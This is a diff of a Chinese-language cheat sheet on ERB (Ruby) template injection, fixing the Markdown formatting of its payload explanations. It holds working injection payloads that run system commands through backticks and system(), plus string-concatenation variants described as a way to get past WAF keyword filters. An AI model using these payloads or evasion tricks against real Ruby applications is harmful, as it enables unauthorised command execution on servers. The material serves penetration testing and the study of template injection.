@@ -968,7 +968,7 @@ _ERB(Ruby)模板引擎注入攻击技术_
 <%= `ls -la` %>
 ```
 **语法解析：**
-- ``` — Ruby反引号执行系统命令 _value_
+- ``<%= `id` %>`` — Ruby反引号执行系统命令 _value_
 
 **4. 命令执行 - system**
 > 使用system/exec执行命令并获取反弹Shell
@@ -993,9 +993,9 @@ _platform: linux_
 <%= ("i"+"d").then { |c| system(c) } %>
 ```
 **语法解析：**
-- `<%= `i` + `d` %>
-<%= system("wh"+"oami") %>
-<%= ("i"+"d").` — 模板表达式注入 _value_
+- ``<%= `i` + `d` %>`` — 模板表达式注入 _value_
+- `<%= system("wh"+"oami") %>` — 字符串拼接绕过 WAF 关键字 _technique_
+- `<%= ("i"+"d").then { |c| system(c) } %>` — 拼接后执行 _technique_
 
 **使用%语法**
 > 使用%x语法执行命令
